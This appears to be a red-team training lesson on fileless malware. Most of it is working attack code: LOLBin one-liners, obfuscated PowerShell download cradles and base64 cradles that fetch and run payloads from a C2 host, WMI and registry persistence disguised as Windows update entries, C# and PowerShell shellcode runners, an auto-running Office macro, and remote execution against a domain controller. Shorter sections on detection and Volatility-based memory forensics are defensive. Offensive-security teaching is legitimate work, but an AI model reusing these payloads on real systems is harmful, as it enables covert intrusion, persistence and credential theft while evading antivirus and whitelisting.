Fileless Malware Concept and Classification
Defining "Fileless"
THE FILELESS SPECTRUM:
======================

Fileless malware is not binary -- it exists on a spectrum:

Level 1: No Files at All
  - Entire chain operates in memory
  - No payload written to disk at any stage
  - Example: Network exploit -> in-memory shellcode -> reflective C2 agent
  - Rarest and most sophisticated

Level 2: No Executable Files
  - May use configuration/data files (scripts, registry entries)
  - No traditional PE files on disk
  - Example: PowerShell script downloaded and executed in-memory,
             persistence via registry value containing script

Level 3: Indirect File Execution
  - Uses legitimate system executables to run malicious code
  - The "malicious code" may be in a file but not a traditional executable
  - Example: mshta.exe running an HTA file, rundll32 with JavaScript

MICROSOFT'S CLASSIFICATION:
  Type I:   No file activity at all (pure memory-resident)
  Type II:  No file on the file system (uses registry, WMI repository)
  Type III: Files required for operation but are not traditional malware
            (scripts, documents with macros, LOLBins)
Why Fileless Techniques Matter
SECURITY CONTROL BYPASS:
=========================

1. Traditional Antivirus (File Scanning)
   AV scans files on disk -- nothing to scan if there is no file.

2. Application Whitelisting
   Fileless techniques use ALREADY-APPROVED system binaries.
   PowerShell, WMI, mshta, rundll32 are all trusted.

3. File Integrity Monitoring (FIM)
   FIM watches for new or changed files -- no files, no alerts.

4. Disk Forensics
   Traditional disk forensics relies on file artifacts.
   Pure fileless operations leave no disk artifacts.

WHAT FILELESS DOES NOT BYPASS:
- Behavioral detection (EDR watching process behavior)
- PowerShell logging (ScriptBlock, Module, Transcription)
- ETW telemetry (Event Tracing for Windows)
- Network detection (C2 traffic still flows)
- Memory forensics (code lives in memory)
- Kernel callbacks (process creation, thread creation)
Living Off the Land (LOL)
LOLBins, LOLLibs, and LOLScripts
LIVING OFF THE LAND BINARIES (LOLBins):
========================================
System binaries that can be abused for:
- Code execution
- Downloading files
- Compiling code
- Bypassing UAC
- DLL side-loading

COMMON LOLBins FOR EXECUTION:
  mshta.exe          - Execute HTA/JavaScript/VBScript
  rundll32.exe       - Execute DLL exports or JavaScript
  regsvr32.exe       - Execute scriptlets via COM (Squiblydoo)
  certutil.exe       - Download and decode files
  msbuild.exe        - Compile and execute C# inline tasks
  installutil.exe    - Execute .NET assemblies via installer
  regasm.exe         - Execute .NET assemblies via COM registration
  regsvcs.exe        - Execute .NET assemblies via COM+ registration
  cmstp.exe          - Execute via INF file SCT reference
  wmic.exe           - Execute via XSL stylesheets
  forfiles.exe       - Execute commands via file matching
  pcalua.exe         - Program Compatibility Assistant (proxy exec)
  bash.exe           - WSL execution
  wscript.exe        - Execute VBS/JS scripts
  cscript.exe        - Execute VBS/JS scripts (console)

DOWNLOAD LOLBins:
  certutil.exe       - certutil -urlcache -split -f <url> <output>
  bitsadmin.exe      - bitsadmin /transfer job <url> <output>
  curl.exe           - curl -o <output> <url> (Win10+)
  powershell.exe     - Various download cradles
  expand.exe         - expand <url> <output> (cab files)
  esentutl.exe       - Copy files using /y flag
  desktopimgdownldr  - Download via COM object
LOLBin Execution Examples
# MSHTA - Execute HTA inline or from URL
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -ep bypass -c IEX(IWR('http://team-server/payload.ps1'))"", 0:close")
mshta http://team-server/payload.hta

# RUNDLL32 - Execute JavaScript
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(IWR('http://team-server/payload.ps1'))")

# REGSVR32 - Squiblydoo (network-based scriptlet)
regsvr32 /s /n /u /i:http://team-server/payload.sct scrobj.dll

# MSBUILD - Execute C# inline task
# Requires an XML project file with inline C# task (payload.xml):
msbuild.exe C:\temp\payload.xml
# Can also use from network share:
msbuild.exe \\attacker\share\payload.xml

# WMIC - Execute via XSL stylesheet
wmic os get /format:"http://team-server/payload.xsl"
# Local XSL:
wmic process list /format:"C:\temp\payload.xsl"

# CERTUTIL - Download and decode
certutil -urlcache -split -f http://team-server/payload.b64 C:\temp\payload.b64
certutil -decode C:\temp\payload.b64 C:\temp\payload.exe

# CMSTP - Execute via INF file
cmstp.exe /ni /s C:\temp\payload.inf

# INSTALLUTIL - Execute .NET assembly
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\temp\payload.exe
LOLAS Reference
LOLBAS Project: https://lolbas-project.github.io/
GTFOBins (Linux): https://gtfobins.github.io/

Categories in LOLBAS:
  - Execute: Run arbitrary code
  - Download: Fetch files from network
  - Upload: Exfiltrate data
  - AWL Bypass: Application Whitelisting bypass
  - Compile: Compile source to executable
  - UAC Bypass: Bypass User Account Control
  - Encode/Decode: Obfuscate data
  - Copy: Move files between locations
  - Credentials: Access stored credentials
PowerShell-Based Fileless Execution
Download Cradles
# BASIC CRADLES (in-memory script execution, nothing on disk):

# 1. WebClient DownloadString (most common)
IEX (New-Object Net.WebClient).DownloadString('http://team-server/payload.ps1')

# 2. Invoke-WebRequest (PowerShell 3+)
IEX (Invoke-WebRequest -Uri 'http://team-server/payload.ps1' -UseBasicParsing).Content

# 3. Invoke-RestMethod
IEX (Invoke-RestMethod -Uri 'http://team-server/payload.ps1')

# 4. .NET WebClient with custom headers
$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$wc.Headers.Add("Cookie", "auth=token123")
IEX $wc.DownloadString('https://cdn.legit-site.com/update.js')

# 5. COM Object (WinHttp.WinHttpRequest)
$h = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$h.Open('GET', 'http://team-server/payload.ps1', $false)
$h.Send()
IEX $h.ResponseText

# 6. COM Object (Msxml2.XMLHTTP)
$x = New-Object -ComObject Msxml2.XMLHTTP
$x.Open('GET', 'http://team-server/payload.ps1', $false)
$x.Send()
IEX $x.ResponseText

# 7. .NET HttpClient (modern .NET)
$c = [System.Net.Http.HttpClient]::new()
$r = $c.GetStringAsync('http://team-server/payload.ps1').Result
IEX $r

# 8. DNS TXT record (exfiltration-friendly network)
$r = Resolve-DnsName -Name payload.attacker.com -Type TXT
IEX ($r.Strings -join '')
Obfuscated Cradles
# OBFUSCATION TECHNIQUES to evade script-based detection:

# String concatenation
$u = 'http://te' + 'am-se' + 'rver/pay' + 'load.ps1'
IEX (New-Object Net.WebClient).DownloadString($u)

# String formatting
IEX (New-Object ("{2}.{0}{1}" -f 'bCli','ent','Net.We')).("{0}{1}" -f 'Downloa','dString').Invoke('http://team-server/payload.ps1')

# Variable substitution
${h} = "http://team-server/payload.ps1"
.('{0}{1}'-f'IE','X') (.('{0}{1}{2}'-f'New','-Ob','ject') ("{0}{1}"-f'Net.We','bClient')).("{0}{1}"-f'Download','String').Invoke(${h})

# Environment variable based
$env:c = 'IEX (New-Object Net.WebClient).DownloadString("http://team-server/payload.ps1")'
powershell -ep bypass -c "$env:c | IEX"

# Encoded command (Base64)
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://team-server/payload.ps1")'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc $encoded

# ScriptBlock from byte array
$bytes = [System.Convert]::FromBase64String("SQBFAFIAIAAA...")
$script = [System.Text.Encoding]::Unicode.GetString($bytes)
$sb = [ScriptBlock]::Create($script)
& $sb
PowerShell Constrained Language Mode Consideration
CONSTRAINT: In CLM (Constrained Language Mode), many fileless techniques fail:
- New-Object is restricted
- Add-Type is blocked
- COM objects are blocked
- .NET types are restricted
- Only core cmdlets work

BYPASS REQUIRED FIRST (see Module 11, Lesson 04):
- CLM bypass via InstallUtil, MSBuild, or custom runspace
- Downgrade to PowerShell v2 (if available, no CLM support)
- Use alternative scripting (VBScript, JScript) that are not constrained
WMI-Based Fileless Operations
WMI for Fileless Execution
# WMI (Windows Management Instrumentation) enables fileless execution
# through event subscriptions that persist across reboots

# REMOTE EXECUTION (fileless on target):
# Process creation via WMI (similar to psexec but no file drop)
wmic /node:TARGET process call create "powershell -ep bypass -c IEX(IWR('http://team-server/payload.ps1'))"

# PowerShell WMI execution
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "powershell -ep bypass -c IEX(IWR('http://team-server/payload.ps1'))"

# CIM (modern replacement for WMI)
Invoke-CimMethod -ComputerName TARGET -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell -ep bypass -enc <ENCODED>"}
WMI Event Subscription Persistence (Fileless)
# WMI Event Subscriptions create persistence WITHOUT files on disk
# Three components: Filter, Consumer, Binding

# 1. EVENT FILTER - When to trigger
$filterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = 'WindowsUpdateCheck'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

# 2. EVENT CONSUMER - What to execute (CommandLine Consumer)
$consumerArgs = @{
    Name = 'WindowsUpdateHandler'
    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -c `"IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SUVYI...')))`""
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

# 3. BINDING - Link filter to consumer
$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs

# ALTERNATE CONSUMER: ActiveScript (runs VBScript/JScript directly)
$consumerArgs = @{
    Name = 'WindowsUpdateScript'
    ScriptingEngine = 'VBScript'
    ScriptText = 'Set objShell = CreateObject("WScript.Shell") : objShell.Run "powershell -ep bypass -c IEX(IWR(''http://team-server/p.ps1''))", 0'
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class ActiveScriptEventConsumer -Arguments $consumerArgs

# CLEANUP:
Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='WindowsUpdateCheck'" | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateHandler'" | Remove-WmiObject
Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match 'WindowsUpdateCheck' } | Remove-WmiObject
WMI Repository as Storage
WMI REPOSITORY AS FILELESS STORAGE:
=====================================
The WMI repository (C:\Windows\System32\wbem\Repository\) stores WMI data.
Attackers can store payloads INSIDE the WMI repository itself.

# Store data in a custom WMI class
$class = New-Object System.Management.ManagementClass('root\cimv2', $null, $null)
$class['__CLASS'] = 'Win32_UpdateConfig'
$class.Qualifiers.Add('static', $true)
$class.Properties.Add('Payload', [System.Management.CimType]::String, $false)
$class.Properties['Payload'].Qualifiers.Add('key', $true)
$class.Put()

# Store payload (base64 encoded)
$encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\payload.exe"))
$instance = $class.CreateInstance()
$instance['Payload'] = $encoded
$instance.Put()

# Retrieve and execute later
$stored = Get-WmiObject -Class Win32_UpdateConfig
$bytes = [Convert]::FromBase64String($stored.Payload)
# Load in memory via Assembly.Load or reflective injection

FORENSIC NOTE:
- Data is stored in: C:\Windows\System32\wbem\Repository\OBJECTS.DATA
- Not easily visible without WMI queries
- Persists across reboots
- Survives standard file cleanup
- Detection: Sysmon 19/20/21, WMI activity logs
.NET In-Memory Execution
Assembly.Load from Byte Array
// The core .NET fileless technique: load assemblies from memory
// No DLL or EXE touches disk

using System;
using System.Net;
using System.Reflection;

class FilelessDotNet {
    static void Main() {
        // Download assembly bytes to memory
        WebClient wc = new WebClient();
        byte[] assemblyBytes = wc.DownloadData("http://team-server/tool.exe");

        // Load assembly entirely in memory
        Assembly asm = Assembly.Load(assemblyBytes);

        // Invoke entry point with arguments
        string[] args = new string[] { "--collect", "All" };
        asm.EntryPoint.Invoke(null, new object[] { args });
    }
}
PowerShell .NET Assembly Loading
# Load .NET assembly from memory using PowerShell

# Method 1: Download bytes and load
$bytes = (New-Object Net.WebClient).DownloadData('http://team-server/Rubeus.exe')
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, @(,@("kerberoast")))

# Method 2: From Base64 string (embedded in script)
$b64 = "TVqQAAMAAAAE..."  # Base64-encoded assembly
$bytes = [Convert]::FromBase64String($b64)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, @(,@("dump")))

# Method 3: Using reflection to call static methods
$bytes = (New-Object Net.WebClient).DownloadData('http://team-server/SharpTool.dll')
$assembly = [System.Reflection.Assembly]::Load($bytes)
$type = $assembly.GetType("Namespace.ClassName")
$method = $type.GetMethod("MethodName")
$method.Invoke($null, @("arg1", "arg2"))

# OPSEC CONCERN: CLR Loading
# When a non-.NET process loads a .NET assembly, these DLLs are loaded:
#   - mscoree.dll (CLR bootstrap)
#   - clr.dll (CLR runtime)
#   - clrjit.dll (JIT compiler)
# Sysmon Event 7 logs these DLL loads
# EDR specifically flags CLR loading in processes like cmd.exe, notepad.exe
Registry-Resident Malware
Storing Payloads in Registry
# The Windows Registry can store binary data up to ~1MB per value
# Payload lives entirely in the registry -- no file on disk

# STEP 1: Encode payload and store in registry
$payloadBytes = (New-Object Net.WebClient).DownloadData('http://team-server/beacon.bin')
$encoded = [Convert]::ToBase64String($payloadBytes)

# Store in a registry value that blends in
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' `
    -Name 'SlowContextMenuEntries' -Value $encoded

# STEP 2: Create a loader that reads from registry and executes
$loader = @'
$data = (Get-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SlowContextMenuEntries').SlowContextMenuEntries
$bytes = [Convert]::FromBase64String($data)
# Execute shellcode from bytes...
# (Use techniques from Lesson 07 for execution)
'@

# STEP 3: Create persistence that runs the loader
$encodedLoader = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($loader))
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'SecurityHealth' -Value "powershell -ep bypass -w hidden -enc $encodedLoader"

# RESULT: No payload file on disk
# The payload is stored as a registry value (binary data in base64)
# The loader is embedded in a Run key as an encoded PowerShell command
# On user login: Run key -> PowerShell -> reads registry -> decodes -> executes
Fileless Registry Backdoor Pattern
REGISTRY-ONLY ATTACK CHAIN:
==============================

1. STORAGE: Payload stored as REG_SZ or REG_BINARY
   Location: HKCU\SOFTWARE\Microsoft\<legitimate-looking-key>
   Content: Base64-encoded shellcode or .NET assembly

2. TRIGGER: Run key, scheduled task, or WMI subscription
   Points to: powershell.exe with encoded command

3. LOADER: Encoded PowerShell reads registry, decodes, executes
   Method: [Reflection.Assembly]::Load() or shellcode runner

4. EXECUTION: Payload runs entirely in memory
   No file ever created on disk

DETECTION:
- Registry value containing large encoded data
- PowerShell -enc with long encoded strings
- Sysmon 13 (Registry value set) for large values
- Registry value names that do not match expected schema
Shellcode Runners
In-Memory Shellcode Execution
// C# shellcode runner -- executes shellcode without dropping executable payload
using System;
using System.Runtime.InteropServices;

class ShellcodeRunner {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start,
                                       IntPtr param, uint flags, IntPtr id);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr handle, uint ms);

    static void Main() {
        // Shellcode (XOR encrypted, key = 0xFA)
        byte[] encrypted = new byte[] { 0xA6, 0x92, 0xDB, ... };

        // Decrypt
        byte[] shellcode = new byte[encrypted.Length];
        byte key = 0xFA;
        for (int i = 0; i < encrypted.Length; i++) {
            shellcode[i] = (byte)(encrypted[i] ^ key);
        }

        // Allocate RW memory
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
                                    0x3000, 0x04); // PAGE_READWRITE

        // Copy shellcode
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);

        // Change to RX (avoid RWX)
        uint oldProtect;
        VirtualProtect(addr, (uint)shellcode.Length, 0x20, out oldProtect); // PAGE_EXECUTE_READ

        // Execute
        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr addr, uint size, uint newProtect,
                                       out uint oldProtect);
}
PowerShell Shellcode Runner
# PowerShell shellcode execution via delegates (no Add-Type required in some versions)

function Invoke-Shellcode {
    param([byte[]]$Shellcode)

    $TypeBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object Reflection.AssemblyName('a')), 'Run'
    ).DefineDynamicModule('m').DefineType('t', 'Public')

    # Define P/Invoke methods
    $VA = $TypeBuilder.DefineMethod('VirtualAlloc',
        'Public, Static', [IntPtr],
        @([IntPtr], [UInt32], [UInt32], [UInt32]))
    # ... (complete P/Invoke definitions)

    $Type = $TypeBuilder.CreateType()

    # Allocate, copy, execute
    $mem = $Type::VirtualAlloc([IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
    [Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $mem, $Shellcode.Length)

    # Create delegate and invoke
    $delegate = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        $mem, (Get-DelegateType @() ([Void])))
    $delegate.Invoke()
}

# Download shellcode and execute in-memory
$sc = (New-Object Net.WebClient).DownloadData('http://team-server/beacon.bin')
Invoke-Shellcode -Shellcode $sc
Reflective Injection for Fileless C2
Fileless C2 Agent Deployment
FILELESS C2 DEPLOYMENT CHAIN:
================================

Step 1: Initial Access (e.g., phishing macro, exploit)
  |
  +-- Macro calls PowerShell download cradle
  |   No file written; cradle runs in memory
  |
Step 2: Stager Downloads Shellcode
  |
  +-- PowerShell downloads raw shellcode (Beacon, etc.)
  |   Shellcode stored in PowerShell variable (memory only)
  |
Step 3: Process Injection
  |
  +-- Shellcode injected into legitimate process
  |   (explorer.exe, svchost.exe, RuntimeBroker.exe)
  |   Injection via: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
  |   Or: Early Bird APC injection, NtQueueApcThread
  |
Step 4: Reflective Loading
  |
  +-- Shellcode reflectively loads C2 agent DLL in target process
  |   DLL never touches disk
  |   DLL self-loads via custom PE loader (ReflectiveLoader)
  |
Step 5: C2 Communications
  |
  +-- C2 agent communicates over HTTPS/DNS/SMB
  |   All subsequent operations are in-memory
  |
Step 6: Post-Exploitation
  |
  +-- All tools loaded via execute-assembly (in-memory .NET)
  +-- Or via BOFs (compiled C objects, in-memory)
  +-- Credential harvesting from LSASS memory
  +-- No tools ever written to disk

RESULT: Entire attack chain is fileless from disk perspective
Sleep Mask and Memory Encryption
ADVANCED C2 MEMORY PROTECTION:
================================

Problem: Even fileless implants exist in process memory
         Memory scanners can find implant code

Solution: Sleep Mask (Cobalt Strike 4.4+)
  When the beacon is sleeping (not actively communicating):
  1. Encrypt the beacon's memory region
  2. Change memory permissions to RW (remove Execute)
  3. Sleep for the specified interval
  4. Wake up, restore Execute permission
  5. Decrypt beacon memory
  6. Execute C2 callback
  7. Re-encrypt and sleep

Custom Implementation Concept:
  1. Before sleep: XOR/AES encrypt all beacon code sections
  2. Register a timer callback (or use NtDelayExecution)
  3. On wake: Decrypt, execute, re-encrypt
  4. Memory scanning during sleep finds only encrypted data

Tools:
  - Cobalt Strike: Built-in sleep_mask (Malleable C2)
  - Ekko/Foliage: Open-source sleep obfuscation
  - Nighthawk: Commercial C2 with sleep encryption
Fileless Persistence Mechanisms
WMI + PowerShell Persistence
# FILELESS PERSISTENCE: No executable file on disk

# Method 1: WMI Event Subscription (covered above)
# Trigger: System event (boot, login, timer)
# Action: Execute encoded PowerShell

# Method 2: Registry Run Key with Encoded Command
$payload = 'IEX (New-Object Net.WebClient).DownloadString("http://team-server/implant.ps1")'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'OneDriveSync' `
    -Value "powershell.exe -w hidden -ep bypass -enc $encoded"

# Method 3: Scheduled Task with Encoded PowerShell
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-w hidden -ep bypass -enc $encoded"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "Microsoft\Windows\NetCfg\HostConfig" `
    -Action $action -Trigger $trigger -Settings $settings

# Method 4: COM Hijacking (CLSID override)
# Find a COM object that is loaded by a common process
# Override InprocServer32 to point to a malicious DLL or scriptlet
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{01234567-89AB-CDEF-0123-456789ABCDEF}\InprocServer32' -Force
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{01234567-89AB-CDEF-0123-456789ABCDEF}\InprocServer32' `
    -Name '(Default)' -Value 'C:\Windows\System32\scrobj.dll'
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{01234567-89AB-CDEF-0123-456789ABCDEF}\InprocServer32' `
    -Name 'ThreadingModel' -Value 'Both'
# This causes scrobj.dll to load, which can be directed to a scriptlet

# Method 5: BITS Job Persistence
bitsadmin /create /download UpdateCheck
bitsadmin /addfile UpdateCheck http://team-server/payload.ps1 C:\Windows\Temp\update.ps1
bitsadmin /SetNotifyCmdLine UpdateCheck "powershell.exe" "-ep bypass -f C:\Windows\Temp\update.ps1"
bitsadmin /SetMinRetryDelay UpdateCheck 60
bitsadmin /resume UpdateCheck
VBScript and JScript In-Memory Execution
VBScript Fileless Execution
' VBScript executed via wscript/cscript or embedded in HTA/SCT files

' Method 1: Download and execute PowerShell via VBScript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -ep bypass -w hidden -c ""IEX(IWR('http://team-server/p.ps1'))""", 0, False

' Method 2: Direct COM-based execution (no PowerShell)
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", "http://team-server/payload.vbs", False
http.Send
Execute http.ResponseText

' Method 3: Scriptlet (SCT) for regsvr32 execution
' File: payload.sct (delivered via regsvr32 /s /n /u /i:URL scrobj.dll)
<?XML version="1.0"?>
<scriptlet>
<registration progid="TESTING" classid="{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}">
<script language="JScript">
<![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell -ep bypass -w hidden -enc ENCODED_PAYLOAD", 0);
]]>
</script>
</registration>
</scriptlet>
JScript Fileless Execution
// JScript executed via wscript/cscript, mshta, or regsvr32

// Method 1: Download and execute via WScript
var wsc = new ActiveXObject("WScript.Shell");
var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
http.Open("GET", "http://team-server/payload.ps1", false);
http.Send();
wsc.Run("powershell -ep bypass -w hidden -c \"" + http.ResponseText + "\"", 0, false);

// Method 2: DotNetToJScript (.NET in JScript)
// Loads a .NET assembly serialized as a JScript byte array
// Uses BinaryFormatter deserialization to load .NET code
// Tool: DotNetToJScript by James Forshaw
// This technique loads arbitrary .NET assemblies via JScript
// without touching disk with an executable

// Method 3: XSL Transform (for WMIC execution)
// File: payload.xsl
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:user="urn:user">
<msxsl:script language="JScript" implements-prefix="user">
function execute(){
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("powershell -ep bypass -w hidden -enc ENCODED_PAYLOAD", 0);
}
</msxsl:script>
<xsl:template match="/">
    <xsl:value-of select="user:execute()"/>
</xsl:template>
</xsl:stylesheet>
// Execute: wmic os get /format:"http://team-server/payload.xsl"
Macro-Based Fileless Execution
Office Macro to Fileless Chain
' VBA macro that creates a fully fileless attack chain
' No executable file is dropped to disk

Sub AutoOpen()
    ' Method 1: PowerShell download cradle
    Dim cmd As String
    cmd = "powershell -w hidden -ep bypass -c ""IEX(IWR('http://team-server/implant.ps1'))"""
    CreateObject("WScript.Shell").Run cmd, 0, False

    ' Method 2: WMI Process Creation (alternative to Shell.Run)
    Dim objWMI As Object
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    objWMI.Create cmd, Null, Null, pid

    ' Method 3: Shellcode execution via VBA (no PowerShell)
    ' Uses VBA to call Win32 APIs directly
    Dim shellcode() As Byte
    ' ... (shellcode bytes embedded in macro)
    ' VirtualAlloc, RtlMoveMemory, CreateThread via Declare statements
End Sub

' API Declarations for Method 3:
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
    ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
    ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
    ByVal lpStartAddress As LongPtr, lpParameter As Long, _
    ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Fileless Lateral Movement
Remote Fileless Execution Methods
# LATERAL MOVEMENT WITHOUT DROPPING FILES:

# 1. WMI Remote Process Creation
Invoke-WmiMethod -ComputerName DC01 -Class Win32_Process -Name Create `
    -ArgumentList "powershell -ep bypass -w hidden -enc $encodedPayload"

# 2. PowerShell Remoting (WinRM)
Invoke-Command -ComputerName DC01 -ScriptBlock {
    IEX (New-Object Net.WebClient).DownloadString('http://team-server/implant.ps1')
}

# 3. DCOM Remote Execution
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "DC01"))
$com.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-ep bypass -w hidden -enc $encodedPayload", "7")

# 4. PSExec-style (but fileless via named pipe for output)
# Standard PSExec drops a service binary -- avoid this
# Instead use Impacket's smbexec which uses cmd.exe + output redirection

# 5. WinRM with PassTheHash (Evil-WinRM)
# evil-winrm -i DC01 -u admin -H NTLM_HASH
# Then execute in-memory within the WinRM session

# 6. SCM via RPC (Service Control Manager)
# Create a service that runs a PowerShell command
sc.exe \\DC01 create TmpSvc binPath= "cmd /c powershell -ep bypass -enc $encoded" start= demand
sc.exe \\DC01 start TmpSvc
sc.exe \\DC01 delete TmpSvc
# Note: This creates/deletes a service but runs PowerShell in-memory
Memory Forensics Challenges
What Memory Analysis Reveals
MEMORY FORENSICS vs FILELESS MALWARE:
========================================

WHAT MEMORY FORENSICS CAN FIND:
1. Injected code in process memory
   - Unbacked executable pages (not mapped from a file)
   - PE headers in private memory (MZ/PE signatures)
   - Tool: Volatility malfind, pe-sieve, Moneta

2. .NET assemblies loaded from byte arrays
   - CLR metadata in process memory
   - Assembly names, method names, namespaces
   - Tool: .NET memory analysis plugins

3. PowerShell script content
   - Decoded script blocks in PowerShell process memory
   - Command history in process memory
   - Tool: Volatility PowerShell plugin, strings analysis

4. Network indicators
   - C2 URLs, IP addresses in process memory
   - HTTP headers, authentication tokens
   - Tool: Volatility netscan, strings with regex

5. Decrypted payloads
   - During execution, payload MUST be decrypted
   - Memory dump at right time captures cleartext payload
   - Tool: Process dump, memory snapshot

WHAT MEMORY FORENSICS STRUGGLES WITH:
1. Sleep-encrypted implants (payload encrypted during sleep)
2. Memory-only execution that has completed and freed memory
3. Stack-based execution (shellcode on stack, then stack reused)
4. Volatile memory after system reboot (everything lost)
5. Anti-forensics in kernel memory (if attacker has kernel access)
Volatility Analysis of Fileless Attacks
# Volatility 3 commands for analyzing fileless malware

# Find injected code (unbacked executable memory)
vol3 -f memory.dmp windows.malfind

# List all process memory mappings
vol3 -f memory.dmp windows.memmap --pid 1234

# Dump process memory for analysis
vol3 -f memory.dmp windows.pslist --dump --pid 1234

# Find loaded .NET assemblies
vol3 -f memory.dmp windows.modules  # Look for CLR-related modules

# Network connections (find C2)
vol3 -f memory.dmp windows.netscan

# Search for strings (URLs, IPs, commands)
vol3 -f memory.dmp windows.strings --pid 1234

# Registry analysis (find registry-resident payloads)
vol3 -f memory.dmp windows.registry.printkey --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# WMI analysis
vol3 -f memory.dmp windows.wmi  # Analyze WMI subscriptions
Building Fileless Attack Chains
Complete Fileless Red Team Operation
PHASE 1: INITIAL ACCESS
========================
Delivery: Spearphishing email with Office document (macro)
Macro Action: PowerShell download cradle (no file drop)
  -> IEX (New-Object Net.WebClient).DownloadString('https://cdn.updates.com/config.js')

PHASE 2: EXECUTION & IMPLANT
==============================
Downloaded Script: Contains shellcode loader
  -> Shellcode downloaded as encrypted byte array
  -> Decrypted in memory
  -> Injected into RuntimeBroker.exe via Early Bird APC
  -> Reflective DLL loads Cobalt Strike Beacon
  -> Beacon communicates over HTTPS (domain fronting)
  NO FILES ON DISK

PHASE 3: PERSISTENCE
======================
Method: WMI Event Subscription
  -> Filter: __InstanceModificationEvent on system uptime
  -> Consumer: CommandLineEventConsumer with encoded PowerShell
  -> PowerShell reads encrypted stager from registry value
  -> Registry value: HKCU\SOFTWARE\Microsoft\Windows\ShellNoRoam\MUICache
  NO FILES ON DISK (persistence is in WMI repository + registry)

PHASE 4: PRIVILEGE ESCALATION
==============================
Method: In-memory Rubeus (Kerberoasting)
  -> execute-assembly Rubeus.exe kerberoast
  -> Crack service ticket offline
